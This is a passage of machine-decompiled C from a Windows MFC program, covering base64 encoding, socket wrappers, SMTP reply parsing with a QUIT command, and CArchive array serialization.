      v5[v13 - 1] = v9;
      v5[v13] = v12;
      v7 = v13 + 1;
      v14 = v25 + 4;
      v25 += 4;
      if ( a4 && v14 >= 73 )
      {
        v5[v7++] = asc_42739C[0];
        if ( byte_42739D )
          v5[v7++] = byte_42739D;
        v25 = 0;
      }
      if ( !--v26 )
        break;
      v6 = a1;
    }
    v4 = a2;
    v6 = a1;
  }
  if ( v4 % 3 )
  {
    if ( v4 % 3 == 1 )
    {
      v19 = *(unsigned __int8 *)(v8 + v6);
      v20 = v7 + 1;
      v21 = v27[16 * (v19 & 3)];
      v5[v20 - 1] = v27[(v19 >> 2) & 0x3F];
      v5[v20] = v21;
      v18 = v20 + 1;
      v5[v18] = 61;
    }
    else
    {
      if ( v4 % 3 != 2 )
        goto LABEL_22;
      v15 = *(unsigned __int8 *)(v8 + v6 + 1);
      v16 = 16 * (*(_BYTE *)(v8 + v6) & 3);
      v5[v7] = v27[((int)*(unsigned __int8 *)(v8 + v6) >> 2) & 0x3F];
      v17 = v16 | (v15 >> 4) & 0xF;
      v18 = v7 + 2;
      LOBYTE(v15) = v27[4 * (v15 & 0xF)];
      v5[v18 - 1] = v27[v17];
      v5[v18] = v15;
    }
    v22 = v18 + 1;
    v5[v22] = 61;
    v7 = v22 + 1;
    if ( a4 )
    {
      v5[v7] = asc_42739C[0];
      v23 = byte_42739D;
      ++v7;
      if ( byte_42739D )
LABEL_21:
        v5[v7++] = v23;
    }
  }
  else if ( a4 )
  {
    v5[v7] = asc_42739C[0];
    v23 = byte_42739D;
    ++v7;
    if ( byte_42739D )
      goto LABEL_21;
  }
LABEL_22:
  v5[v7] = 0;
  result = v5;
  *a3 = v7;
  return result;
}
// 42739D: using guessed type char byte_42739D;

//----- (00408EA0) --------------------------------------------------------
_DWORD *__thiscall sub_408EA0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = -1;
  return result;
}

//----- (00408EC0) --------------------------------------------------------
BOOL __thiscall sub_408EC0(SOCKET *this, char *buf, int len)
{
  return send(*this, buf, len, 0) != -1;
}

//----- (00408EF0) --------------------------------------------------------
int __thiscall sub_408EF0(SOCKET *this, char *buf, int len)
{
  return recv(*this, buf, len, 0);
}

//----- (00408F10) --------------------------------------------------------
int __thiscall sub_408F10(SOCKET *this)
{
  int result; // eax

  result = *this;
  if ( *this != -1 )
  {
    result = closesocket(*this);
    *this = -1;
  }
  return result;
}

//----- (00408F30) --------------------------------------------------------
int __thiscall sub_408F30(SOCKET *this, _DWORD *a2)
{
  SOCKET v2; // eax
  int v3; // eax
  struct timeval timeout; // [esp+0h] [ebp-10Ch] BYREF
  fd_set readfds; // [esp+8h] [ebp-104h] BYREF

  v2 = *this;
  timeout.tv_sec = 0;
  timeout.tv_usec = 0;
  readfds.fd_array[0] = v2;
  readfds.fd_count = 1;
  v3 = select(0, &readfds, 0, 0, &timeout);
  if ( v3 == -1 )
    return 0;
  *a2 = v3 != 0;
  return 1;
}

//----- (00408FA0) --------------------------------------------------------
_DWORD *__thiscall sub_408FA0(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = off_4276D4;
  this[1] = off_4276D4;
  return result;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00408FC0) --------------------------------------------------------
int __thiscall sub_408FC0(int this, const char **a2)
{
  *(_DWORD *)this = off_4276D4;
  *(_DWORD *)(this + 4) = off_4276D4;
  sub_409020((void **)this, a2);
  return this;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00409020) --------------------------------------------------------
void **__thiscall sub_409020(void **this, const char **a2)
{
  sub_417D9F(this, a2);
  sub_417D9F(this + 1, a2 + 1);
  return this;
}

//----- (00409050) --------------------------------------------------------
CString *__thiscall sub_409050(void *this, CString *a2)
{
  CHAR *v2; // eax
  int v4; // [esp+4h] [ebp-18h] BYREF
  int v5; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+18h] [ebp-4h]

  v6 = 0;
  v4 = (int)off_4276D4;
  v2 = *(CHAR **)this;
  v7 = 1;
  if ( *((_DWORD *)v2 - 2) )
  {
    v5 = (int)off_4276D4;
    LOBYTE(v7) = 2;
    sub_408C20(v2, (CString *)&v5);
    sub_416670((CString *)&v4, aSS, v5);
    LOBYTE(v7) = 1;
    sub_417CB2(&v5);
  }
  else
  {
    sub_417D9F((void **)&v4, (const char **)this + 1);
  }
  sub_417A27(a2, (LPCSTR *)&v4);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_417CB2(&v4);
  return a2;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00409120) --------------------------------------------------------
void __thiscall sub_409120(_DWORD *this)
{
  void *v2; // eax

  v2 = (void *)this[2];
  if ( v2 )
  {
    sub_417A1C(v2);
    this[2] = 0;
  }
  sub_417CB2(this + 1);
  sub_417CB2(this);
}

//----- (00409190) --------------------------------------------------------
_DWORD *__thiscall sub_409190(_DWORD *this)
{
  sub_408FA0(this + 1);
  this[3] = off_4276D4;
  this[4] = off_4276D4;
  sub_408FA0(this + 5);
  this[7] = &off_42022C;
  this[8] = 0;
  this[11] = 0;
  this[10] = 0;
  this[9] = 0;
  this[12] = &off_42022C;
  this[13] = 0;
  this[16] = 0;
  this[15] = 0;
  this[14] = 0;
  this[17] = &off_42022C;
  this[18] = 0;
  this[21] = 0;
  this[20] = 0;
  this[19] = 0;
  this[22] = &off_420220;
  this[23] = 0;
  this[26] = 0;
  this[25] = 0;
  this[24] = 0;
  *this = &off_42021C;
  return this;
}
// 42021C: using guessed type void (__stdcall __noreturn *off_42021C)(int);
// 420220: using guessed type int (*off_420220)();
// 42022C: using guessed type int (*off_42022C)();
// 4276D4: using guessed type void *off_4276D4;

//----- (00409210) --------------------------------------------------------
void __thiscall sub_409210(int this)
{
  void *v2; // eax
  _DWORD *v3; // ebx
  int v4; // ebp
  _DWORD *v5; // ebx
  int v6; // ebp
  _DWORD *v7; // ebx
  int v8; // ebp

  *(_DWORD *)this = &off_42021C;
  sub_4094A0(this);
  *(_DWORD *)(this + 88) = &off_420220;
  v2 = *(void **)(this + 92);
  if ( v2 )
    sub_417A1C(v2);
  *(_DWORD *)(this + 68) = &off_42022C;
  v3 = *(_DWORD **)(this + 72);
  if ( v3 )
  {
    if ( *(_DWORD *)(this + 76) )
    {
      v4 = *(_DWORD *)(this + 76);
      do
      {
        sub_4093A0(v3);
        v3 += 2;
        --v4;
      }
      while ( v4 );
    }
    sub_417A1C(*(LPVOID *)(this + 72));
  }
  *(_DWORD *)(this + 48) = &off_42022C;
  v5 = *(_DWORD **)(this + 52);
  if ( v5 )
  {
    if ( *(_DWORD *)(this + 56) )
    {
      v6 = *(_DWORD *)(this + 56);
      do
      {
        sub_4093A0(v5);
        v5 += 2;
        --v6;
      }
      while ( v6 );
    }
    sub_417A1C(*(LPVOID *)(this + 52));
  }
  *(_DWORD *)(this + 28) = &off_42022C;
  v7 = *(_DWORD **)(this + 32);
  if ( v7 )
  {
    if ( *(_DWORD *)(this + 36) )
    {
      v8 = *(_DWORD *)(this + 36);
      do
      {
        sub_4093A0(v7);
        v7 += 2;
        --v8;
      }
      while ( v8 );
    }
    sub_417A1C(*(LPVOID *)(this + 32));
  }
  sub_417CB2((_DWORD *)(this + 24));
  sub_417CB2((_DWORD *)(this + 20));
  sub_417CB2((_DWORD *)(this + 16));
  sub_417CB2((_DWORD *)(this + 12));
  sub_417CB2((_DWORD *)(this + 8));
  sub_417CB2((_DWORD *)(this + 4));
}
// 42021C: using guessed type void (__stdcall __noreturn *off_42021C)(int);
// 420220: using guessed type int (*off_420220)();
// 42022C: using guessed type int (*off_42022C)();

//----- (004093A0) --------------------------------------------------------
void __thiscall sub_4093A0(_DWORD *this)
{
  sub_417CB2(this + 1);
  sub_417CB2(this);
}

//----- (004093F0) --------------------------------------------------------
void __thiscall sub_4093F0(void **this)
{
  const char *v2; // [esp+4h] [ebp-14h] BYREF
  int v3; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+14h] [ebp-4h]

  sub_408FA0(&v2);
  v4 = 0;
  sub_409020(this + 1, &v2);
  sub_409020(this + 5, &v2);
  CString::Empty((CString *)(this + 3));
  CString::Empty((CString *)(this + 4));
  sub_40A5B0((int)(this + 7), 0, -1);
  sub_40A5B0((int)(this + 12), 0, -1);
  sub_40A5B0((int)(this + 17), 0, -1);
  v4 = 1;
  sub_417CB2(&v3);
  v4 = -1;
  sub_417CB2(&v2);
}

//----- (004094A0) --------------------------------------------------------
void __thiscall sub_4094A0(int this)
{
  int v2; // ebp
  int i; // ebx
  _DWORD *v4; // edi

  v2 = sub_409680((_DWORD *)this);
  for ( i = 0; i < v2; ++i )
  {
    v4 = (_DWORD *)sub_409670((_DWORD *)this, i);
    if ( v4[4] && v4 )
    {
      sub_409120(v4);
      sub_417A1C(v4);
    }
  }
  if ( *(_DWORD *)(this + 92) )
  {
    sub_417A1C(*(LPVOID *)(this + 92));
    *(_DWORD *)(this + 92) = 0;
  }
  *(_DWORD *)(this + 100) = 0;
  *(_DWORD *)(this + 96) = 0;
}

//----- (00409500) --------------------------------------------------------
int __thiscall sub_409500(_DWORD *this, int a2)
{
  int result; // eax

  result = 0;
  switch ( a2 )
  {
    case 0:
      return this[9];
    case 1:
      return this[14];
    case 2:
      return this[19];
  }
  return result;
}

//----- (00409530) --------------------------------------------------------
int __thiscall sub_409530(_DWORD *this, int a2, int a3, int a4)
{
  const char **v5; // eax
  char *v6; // ecx
  const char **v7; // eax
  const char **v8; // eax
  void *v10; // [esp+Ch] [ebp-2Ch] BYREF
  int v11; // [esp+10h] [ebp-28h] BYREF
  char v12[4]; // [esp+14h] [ebp-24h] BYREF
  int v13; // [esp+18h] [ebp-20h] BYREF
  char v14[4]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v15; // [esp+20h] [ebp-18h] BYREF
  char v16[4]; // [esp+24h] [ebp-14h] BYREF
  int v17; // [esp+28h] [ebp-10h] BYREF
  int v18; // [esp+34h] [ebp-4h]

  sub_408FA0(&v10);
  v18 = 1;
  switch ( a4 )
  {
    case 0:
      v8 = (const char **)sub_40A100(this + 7, (int)v16, a3);
      LOBYTE(v18) = 2;
      sub_409020(&v10, v8);
      LOBYTE(v18) = 3;
      sub_417CB2(&v17);
      LOBYTE(v18) = 1;
      v6 = v16;
      goto LABEL_7;
    case 1:
      v7 = (const char **)sub_40A100(this + 12, (int)v14, a3);
      LOBYTE(v18) = 4;
      sub_409020(&v10, v7);
      LOBYTE(v18) = 5;
      sub_417CB2(&v15);
      LOBYTE(v18) = 1;
      v6 = v14;
      goto LABEL_7;
    case 2:
      v5 = (const char **)sub_40A100(this + 17, (int)v12, a3);
      LOBYTE(v18) = 6;
      sub_409020(&v10, v5);
      LOBYTE(v18) = 7;
      sub_417CB2(&v13);
      LOBYTE(v18) = 1;
      v6 = v12;
LABEL_7:
      sub_417CB2(v6);
      break;
  }
  sub_408FC0(a2, (const char **)&v10);
  v18 = 8;
  sub_417CB2(&v11);
  LOBYTE(v18) = 0;
  sub_417CB2(&v10);
  return a2;
}
// 409530: using guessed type char var_24[4];
// 409530: using guessed type char var_1C[4];
// 409530: using guessed type char var_14[4];

//----- (00409670) --------------------------------------------------------
int __thiscall sub_409670(_DWORD *this, int a2)
{
  return *(_DWORD *)(this[23] + 4 * a2);
}

//----- (00409680) --------------------------------------------------------
int __thiscall sub_409680(_DWORD *this)
{
  return this[24];
}

//----- (00409690) --------------------------------------------------------
void __stdcall __noreturn sub_409690(int a1)
{
  DWORD v1; // eax
  LONG Bias; // ecx
  unsigned int v3; // edx
  char v4[4]; // [esp+20h] [ebp-D4h] BYREF
  int v5[4]; // [esp+28h] [ebp-CCh] BYREF
  struct _TIME_ZONE_INFORMATION TimeZoneInformation; // [esp+3Ch] [ebp-B8h] BYREF
  int v7; // [esp+F0h] [ebp-4h]

  v5[3] = 0;
  v1 = GetTimeZoneInformation(&TimeZoneInformation);
  Bias = TimeZoneInformation.Bias;
  if ( v1 == 2 )
    Bias = TimeZoneInformation.DaylightBias + TimeZoneInformation.Bias;
  v5[0] = (int)off_4276D4;
  v7 = 1;
  v3 = (int)(((unsigned __int64)(2004318071i64 * Bias) >> 32) - Bias) >> 5;
  sub_416670((CString *)v5, a2d2d, (v3 >> 31) + v3);
  ((void (__stdcall __noreturn *)(char *))loc_416708)(v4);
}
// 4276D4: using guessed type void *off_4276D4;
// 409690: using guessed type char var_D4[4];

//----- (00409B20) --------------------------------------------------------
_DWORD *__thiscall sub_409B20(_DWORD *this)
{
  sub_408EA0(this);
  sub_41676C(this + 3);
  sub_41676C(this + 8);
  this[14] = off_4276D4;
  this[1] = 0;
  this[13] = 0;
  this[2] = 2000;
  return this;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (00409B90) --------------------------------------------------------
int __thiscall sub_409B90(SOCKET *this)
{
  if ( this[1] )
    sub_409C10(this);
  sub_417CB2(this + 14);
  CStringArray::~CStringArray((CStringArray *)(this + 8));
  CStringArray::~CStringArray((CStringArray *)(this + 3));
  return sub_408EB0(this);
}

//----- (00409C10) --------------------------------------------------------
int __thiscall sub_409C10(SOCKET *this)
{
  int v2; // esi
  int v3; // edx
  char buf[12]; // [esp+8h] [ebp-Ch] BYREF

  v2 = 0;
  if ( this[1] )
  {
    strcpy(buf, aQuit);
    sub_408EC0(this, buf, strlen(buf));
    v2 = sub_409CA0((int)this, v3, 221);
    if ( !v2 )
      SetLastError(0x16u);
    this[1] = 0;
  }
  sub_408F10(this);
  return v2;
}
// 409C69: variable 'v3' is possibly undefined

//----- (00409CA0) --------------------------------------------------------
int __fastcall sub_409CA0(int a1, int a2, int a3)
{
  SOCKET *v3; // edi
  int v4; // ebx
  int v5; // ebp
  int v6; // eax
  int v7; // esi
  const char *v8; // edi
  char *v9; // ebp
  char *v10; // esi
  char *i; // esi
  char *v12; // esi
  const char *v13; // esi
  char *v14; // eax
  char *v15; // ebx
  char *j; // esi
  const char *v17; // ebp
  char k; // al
  char *v19; // eax
  char *v20; // esi
  unsigned __int8 v21; // dl
  char *v22; // eax
  char *v23; // ecx
  unsigned __int8 v24; // dl
  char v25; // al
  const CHAR *v26; // esi
  unsigned __int8 v27; // al
  int v28; // esi
  const char **v29; // eax
  CString *v30; // ebx
  CString *v31; // eax
  SOCKET v32; // edi
  char *Str; // [esp+10h] [ebp-42Ch]
  CString *v35; // [esp+14h] [ebp-428h]
  bool v36; // [esp+1Bh] [ebp-421h]
  unsigned int v37; // [esp+1Ch] [ebp-420h] BYREF
  DWORD TickCount; // [esp+20h] [ebp-41Ch] BYREF
  LPVOID lpMem; // [esp+24h] [ebp-418h]
  size_t v40; // [esp+28h] [ebp-414h]
  int v41; // [esp+2Ch] [ebp-410h] BYREF
  char v42; // [esp+30h] [ebp-40Ch] BYREF
  int v43; // [esp+438h] [ebp-4h]

  v3 = (SOCKET *)a1;
  v4 = 0;
  v37 = a1;
  *(_DWORD *)(a1 + 52) = -1;
  CStringArray::SetSize((CStringArray *)(a1 + 12), 0, -1);
  CStringArray::SetSize((CStringArray *)(v3 + 8), 0, -1);
  v35 = (CString *)(v3 + 14);
  CString::Empty((CString *)(v3 + 14));
  v42 = 0;
  Str = &v42;
  v40 = 1024;
  lpMem = 0;
  TickCount = GetTickCount();
  do
  {
    while ( 1 )
    {
      if ( GetTickCount() - TickCount > v3[2] )
      {
        CString::operator=(v35, asc_427580);
        Str[v4] = 0;
        SetLastError(0x274Cu);
        goto LABEL_27;
      }
      if ( !sub_408F30(v3, &v41) )
      {
LABEL_24:
        CString::operator=(v35, asc_427574);
        Str[v4] = 0;
        goto LABEL_27;
      }
      if ( v41 )
        break;
      Sleep(0xFAu);
    }
    v5 = v40 - v4 - 1;
    if ( v5 < 0 )
      v5 = 0;
    v6 = sub_408EF0(v3, &Str[v4], v5);
    v7 = v6;
    if ( v6 == -1 )
      goto LABEL_24;
    if ( v6 )
    {
      TickCount = GetTickCount();
      v4 += v7;
    }
    Str[v4] = 0;
    if ( v5 == v7 )
    {
      v40 += 4096;
      v8 = Str;
      v9 = (char *)sub_4179F3(v40);
      Str = v9;
      strcpy(v9, v8);
      if ( lpMem )
        sub_417A1C(lpMem);
      v3 = (SOCKET *)v37;
      lpMem = v9;
    }
    v10 = strrchr(Str, 13);
    if ( !v10 )
      v10 = &Str[v4];
    for ( i = v10 - 1; i >= Str; --i )
    {
      if ( *i == 10 )
        break;
    }
    v12 = i + 4;
  }
  while ( v12 >= &Str[v4] || *v12 != 32 );
  *v12 = 0;
  v3[13] = atoi(v12 - 3);
  *v12 = 32;
LABEL_27:
  if ( v3[13] != -1 )
  {
    v13 = Str;
    v37 = (unsigned int)&Str[v4];
    if ( Str < &Str[v4] )
    {
      do
      {
        v14 = strchr(v13, 13);
        if ( !v14 )
          break;
        v15 = v14;
        if ( v14 - v13 > 4 )
        {
          for ( j = (char *)(v13 + 4); v14 > j; --v14 )
          {
            if ( (unsigned __int8)*(v14 - 1) > 0x20u )
              break;
          }
          v17 = j;
          *v14 = 0;
          for ( k = *j; k; k = *++v17 )
          {
            if ( (unsigned __int8)k > 0x20u )
              break;
          }
          v19 = strchr(v17, 32);
          v20 = v19;
          if ( v19 )
          {
            v21 = *(v19 - 1);
            v22 = v19 - 1;
            v23 = v20;
            if ( v21 <= 0x20u )
            {
              do
              {
                v23 = v22;
                v24 = *--v22;
              }
              while ( v24 <= 0x20u );
            }
            *v23 = 0;
            sub_416948((CStringArray *)(v3 + 3), v3[5], v17);
            v25 = v20[1];
            v26 = v20 + 1;
            if ( (unsigned __int8)v25 <= 0x20u )
            {
              do
                v27 = *++v26;
              while ( v27 <= 0x20u );
            }
            sub_416948((CStringArray *)(v3 + 8), v3[10], v26);
          }
          else if ( *v17 )
          {
            sub_416948((CStringArray *)(v3 + 3), v3[5], v17);
            sub_416948((CStringArray *)(v3 + 8), v3[10], byte_443880);
          }
        }
        v13 = v15 + 1;
        if ( (unsigned int)(v15 + 1) >= v37 )
          break;
        if ( *v13 == 10 )
          v13 = v15 + 2;
      }
      while ( (unsigned int)v13 < v37 );
    }
  }
  v28 = v3[5] - 1;
  if ( v28 < 0 )
  {
    if ( *Str )
      CString::operator=(v35, Str);
    v30 = v35;
  }
  else
  {
    v29 = (const char **)sub_40A0D0(v3 + 3, (CString *)&v37, v28);
    v30 = v35;
    v43 = 0;
    sub_417D9F((void **)v35, v29);
    v43 = -1;
    sub_417CB2(&v37);
    v36 = *(_DWORD *)(*(_DWORD *)sub_40A0D0(v3 + 8, (CString *)&v37, v28) - 8) > 0;
    sub_417CB2(&v37);
    if ( v36 )
    {
      sub_417EF4((void **)v35, asc_427570);
      v31 = sub_40A0D0(v3 + 8, (CString *)&TickCount, v28);
      v43 = 1;
      CString::operator+=(v31);
      v43 = -1;
      sub_417CB2(&TickCount);
    }
  }
  if ( lpMem )
    sub_417A1C(lpMem);
  v32 = v3[13];
  if ( v32 == -1 )
  {
    if ( !*(_DWORD *)(*(_DWORD *)v30 - 8) )
      CString::operator=(v30, aSmtp);
    return 0;
  }
  else if ( v32 == a3 )
  {
    return 1;
  }
  else
  {
    if ( !*(_DWORD *)(*(_DWORD *)v30 - 8) )
      CString::operator=(v30, aSmtp_0);
    return 0;
  }
}
// 417F1B: using guessed type _DWORD __stdcall CString::operator+=(_DWORD);

//----- (0040A0D0) --------------------------------------------------------
CString *__thiscall sub_40A0D0(_DWORD *this, CString *a2, int a3)
{
  sub_417A27(a2, (LPCSTR *)(this[1] + 4 * a3));
  return a2;
}

//----- (0040A100) --------------------------------------------------------
int __thiscall sub_40A100(_DWORD *this, int a2, int a3)
{
  sub_408FC0(a2, (const char **)(this[1] + 8 * a3));
  return a2;
}

//----- (0040A130) --------------------------------------------------------
void __thiscall sub_40A130(void *this)
{
  _DWORD *v2; // esi
  int v3; // ecx
  int v4; // edi

  *(_DWORD *)this = &off_42022C;
  v2 = (_DWORD *)*((_DWORD *)this + 1);
  if ( v2 )
  {
    v3 = *((_DWORD *)this + 2);
    if ( v3 )
    {
      v4 = v3;
      do
      {
        sub_417CB2(v2 + 1);
        sub_417CB2(v2);
        v2 += 2;
        --v4;
      }
      while ( v4 );
    }
    sub_417A1C(*((LPVOID *)this + 1));
  }
}
// 42022C: using guessed type int (*off_42022C)();

//----- (0040A1C0) --------------------------------------------------------
void __thiscall sub_40A1C0(int this, CArchive *a2)
{
  CArchive *v2; // edi
  signed int Count; // eax
  signed int v5; // ebp
  _DWORD *v6; // esi
  int v7; // ebp
  int v8; // ecx
  _DWORD *v9; // eax
  signed int v10; // esi
  int v11; // eax
  _DWORD *v12; // esi
  int v13; // ecx
  int v14; // eax
  int v15; // edi
  int v16; // eax
  void *v17; // eax
  int v18; // eax
  char *v19; // ebx
  signed int v20; // [esp+10h] [ebp-8h]
  void *v21; // [esp+14h] [ebp-4h]

  v2 = a2;
  if ( (*((_BYTE *)a2 + 20) & 1) != 0 )
  {
    Count = CArchive::ReadCount(a2);
    v5 = Count;
    if ( Count )
    {
      v8 = *(_DWORD *)(this + 4);
      if ( v8 )
      {
        v10 = *(_DWORD *)(this + 12);
        if ( Count > v10 )
        {
          v16 = *(_DWORD *)(this + 16);
          if ( !v16 )
          {
            v16 = *(_DWORD *)(this + 8) / 8;
            if ( v16 >= 4 )
            {
              if ( v16 > 1024 )
                v16 = 1024;
            }
            else
            {
              v16 = 4;
            }
          }
          v20 = v10 + v16;
          if ( v5 >= v10 + v16 )
            v20 = v5;
          v17 = sub_4179F3(8 * v20);
          qmemcpy(v17, *(const void **)(this + 4), 8 * *(_DWORD *)(this + 8));
          v21 = v17;
          sub_40A730((_DWORD *)v17 + 2 * *(_DWORD *)(this + 8), (_DWORD *)(v5 - *(_DWORD *)(this + 8)));
          sub_417A1C(*(LPVOID *)(this + 4));
          v2 = a2;
          *(_DWORD *)(this + 4) = v21;
          *(_DWORD *)(this + 8) = v5;
          *(_DWORD *)(this + 12) = v20;
        }
        else
        {
          v11 = *(_DWORD *)(this + 8);
          if ( v11 >= v5 )
          {
            if ( v11 > v5 )
            {
              v12 = (_DWORD *)(v8 + 8 * v5);
              v13 = v11 - v5;
              v14 = v11 - v5 - 1;
              if ( v13 )
              {
                v15 = v14 + 1;
                do
                {
                  sub_4093A0(v12);
                  v12 += 2;
                  --v15;
                }
                while ( v15 );
                v2 = a2;
              }
            }
            *(_DWORD *)(this + 8) = v5;
          }
          else
          {
            sub_40A730((_DWORD *)(v8 + 8 * v11), (_DWORD *)(v5 - v11));
            *(_DWORD *)(this + 8) = v5;
          }
        }
      }
      else
      {
        v9 = sub_4179F3(8 * Count);
        *(_DWORD *)(this + 4) = v9;
        sub_40A730(v9, (_DWORD *)v5);
        *(_DWORD *)(this + 12) = v5;
        *(_DWORD *)(this + 8) = v5;
      }
    }
    else
    {
      v6 = *(_DWORD **)(this + 4);
      if ( v6 )
      {
        if ( *(_DWORD *)(this + 8) )
        {
          v7 = *(_DWORD *)(this + 8);
          do
          {
            sub_4093A0(v6);
            v6 += 2;
            --v7;
          }
          while ( v7 );
        }
        sub_417A1C(*(LPVOID *)(this + 4));
        *(_DWORD *)(this + 4) = 0;
      }
      *(_DWORD *)(this + 12) = 0;
      *(_DWORD *)(this + 8) = 0;
    }
  }
  else
  {
    CArchive::WriteCount(a2, *(_DWORD *)(this + 8));
  }
  v18 = *(_DWORD *)(this + 8);
  v19 = *(char **)(this + 4);
  if ( (*((_BYTE *)v2 + 20) & 1) != 0 )
    sub_41B521((int)v2, v19, 8 * v18);
  else
    CArchive::Write(v2, v19, 8 * v18);
}

//----- (0040A390) --------------------------------------------------------
void __thiscall sub_40A390(_DWORD *this)
{
  void *v1; // ecx

  *this = &off_420220;
  v1 = (void *)this[1];
  if ( v1 )
    sub_417A1C(v1);
}
// 420220: using guessed type int (*off_420220)();

//----- (0040A3E0) --------------------------------------------------------
void __thiscall sub_40A3E0(int this, CArchive *a2)
{
  CArchive *v2; // esi
  signed int Count; // eax
  signed int v5; // ebp
  int v6; // edx
  void *v7; // eax
  signed int v8; // ecx
  int v9; // eax
  int v10; // eax
  char *v11; // eax
  int v12; // eax
  char *v13; // ebx
  signed int v14; // [esp+10h] [ebp-8h]
  char *v15; // [esp+14h] [ebp-4h]

  v2 = a2;
  if ( (*((_BYTE *)a2 + 20) & 1) != 0 )
  {
    Count = CArchive::ReadCount(a2);
    v5 = Count;
    if ( Count )
    {
      v6 = *(_DWORD *)(this + 4);
      if ( v6 )
      {
        v8 = *(_DWORD *)(this + 12);
        if ( Count > v8 )
        {
          v10 = *(_DWORD *)(this + 16);
          if ( !v10 )
          {
            v10 = *(_DWORD *)(this + 8) / 8;
            if ( v10 >= 4 )
            {
              if ( v10 > 1024 )
                v10 = 1024;
            }
            else
            {
              v10 = 4;
            }
          }
          v14 = v8 + v10;
          if ( v5 >= v8 + v10 )
            v14 = v5;
          v11 = (char *)sub_4179F3(4 * v14);
          qmemcpy(v11, *(const void **)(this + 4), 4 * *(_DWORD *)(this + 8));
          v15 = v11;
          memset(&v11[4 * *(_DWORD *)(this + 8)], 0, 4 * (v5 - *(_DWORD *)(this + 8)));
          sub_417A1C(*(LPVOID *)(this + 4));
          v2 = a2;
          *(_DWORD *)(this + 4) = v15;
          *(_DWORD *)(this + 8) = v5;
          *(_DWORD *)(this + 12) = v14;
        }
        else
        {
          v9 = *(_DWORD *)(this + 8);
          if ( v5 > v9 )
            memset((void *)(v6 + 4 * v9), 0, 4 * (v5 - v9));
          *(_DWORD *)(this + 8) = v5;
        }
      }
      else
      {
        v7 = sub_4179F3(4 * Count);
        *(_DWORD *)(this + 4) = v7;
        memset(v7, 0, 4 * ((unsigned int)(4 * v5) >> 2));
        *(_DWORD *)(this + 12) = v5;
        *(_DWORD *)(this + 8) = v5;
      }
    }
    else
    {
      if ( *(_DWORD *)(this + 4) )
      {
        sub_417A1C(*(LPVOID *)(this + 4));
        *(_DWORD *)(this + 4) = 0;
      }
      *(_DWORD *)(this + 12) = 0;
      *(_DWORD *)(this + 8) = 0;
    }
  }
  else
  {
    CArchive::WriteCount(a2, *(_DWORD *)(this + 8));
  }
  v12 = *(_DWORD *)(this + 8);
  v13 = *(char **)(this + 4);
  if ( (*((_BYTE *)v2 + 20) & 1) != 0 )
    sub_41B521((int)v2, v13, 4 * v12);
  else
    CArchive::Write(v2, v13, 4 * v12);
}

//----- (0040A570) --------------------------------------------------------
LPVOID __thiscall sub_40A570(LPVOID lpMem, char a2)
{
  sub_40A130(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040A590) --------------------------------------------------------
_DWORD *__thiscall sub_40A590(_DWORD *lpMem, char a2)
{
  sub_40A390(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (0040A5B0) --------------------------------------------------------
void __thiscall sub_40A5B0(int this, int a2, int a3)
{
  _DWORD *v5; // esi
  int v6; // ecx
  int v7; // ebp
  int v8; // ecx
  _DWORD *v9; // eax
  int v10; // esi
  int v11; // eax
  _DWORD *v12; // esi
  int v13; // ecx
  int v14; // eax
  int v15; // edi
  int v16; // eax
  void *v17; // eax
  void *v18; // [esp+14h] [ebp+4h]
  int v19; // [esp+18h] [ebp+8h]

  if ( a3 != -1 )
    *(_DWORD *)(this + 16) = a3;
  if ( a2 )
  {
    v8 = *(_DWORD *)(this + 4);
    if ( v8 )
    {
      v10 = *(_DWORD *)(this + 12);
      if ( a2 > v10 )
      {
        v16 = *(_DWORD *)(this + 16);
        if ( !v16 )
        {
          v16 = *(_DWORD *)(this + 8) / 8;
          if ( v16 >= 4 )
          {
            if ( v16 > 1024 )
              v16 = 1024;
          }
          else
          {
            v16 = 4;
          }
        }
        v19 = v10 + v16;
        if ( a2 >= v10 + v16 )
          v19 = a2;
        v17 = sub_4179F3(8 * v19);
        qmemcpy(v17, *(const void **)(this + 4), 8 * *(_DWORD *)(this + 8));
        v18 = v17;
        sub_40A730((_DWORD *)v17 + 2 * *(_DWORD *)(this + 8), (_DWORD *)(a2 - *(_DWORD *)(this + 8)));
        sub_417A1C(*(LPVOID *)(this + 4));
        *(_DWORD *)(this + 8) = a2;
        *(_DWORD *)(this + 4) = v18;
        *(_DWORD *)(this + 12) = v19;
      }
      else
      {
        v11 = *(_DWORD *)(this + 8);
        if ( v11 >= a2 )
        {
          if ( v11 > a2 )
          {
            v12 = (_DWORD *)(v8 + 8 * a2);
            v13 = v11 - a2;
            v14 = v11 - a2 - 1;
            if ( v13 )
            {
              v15 = v14 + 1;
              do
              {
                sub_4093A0(v12);
                v12 += 2;
                --v15;
              }
              while ( v15 );
            }
          }
          *(_DWORD *)(this + 8) = a2;
        }
        else
        {
          sub_40A730((_DWORD *)(v8 + 8 * v11), (_DWORD *)(a2 - v11));
          *(_DWORD *)(this + 8) = a2;
        }
      }
    }
    else
    {
      v9 = sub_4179F3(8 * a2);
      *(_DWORD *)(this + 4) = v9;
      sub_40A730(v9, (_DWORD *)a2);
      *(_DWORD *)(this + 12) = a2;
      *(_DWORD *)(this + 8) = a2;
    }
  }
  else
  {
    v5 = *(_DWORD **)(this + 4);
    if ( v5 )
    {
      v6 = *(_DWORD *)(this + 8);
      if ( v6 )
      {
        v7 = v6;
        do
        {
          sub_4093A0(v5);
          v5 += 2;
          --v7;
        }
        while ( v7 );
      }
      sub_417A1C(*(LPVOID *)(this + 4));
      *(_DWORD *)(this + 4) = 0;
    }
    *(_DWORD *)(this + 12) = 0;
    *(_DWORD *)(this + 8) = 0;
  }
}

//----- (0040A730) --------------------------------------------------------
_DWORD *__stdcall sub_40A730(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // esi
  _DWORD *result; // eax
  _DWORD *v4; // edi

  v2 = a1;
